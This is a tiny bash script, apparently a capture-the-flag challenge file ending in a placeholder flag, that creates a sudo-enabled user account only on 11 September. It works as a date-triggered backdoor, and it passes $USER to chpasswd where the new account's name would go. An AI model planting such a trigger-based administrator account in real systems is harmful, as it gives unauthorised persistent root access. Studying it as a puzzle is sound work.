NAME=USERNAME
PASS=PASSWORD
if [[ $(date +"%d.%m") == "11.09" ]]; then
    useradd -m -d /home/$NAME -s /bin/bash $NAME
    usermod -a -G sudo $NAME
    echo "$USER:$PASS" | chpasswd
else
    echo "Today is not your day"
fi
#flag:FLAG
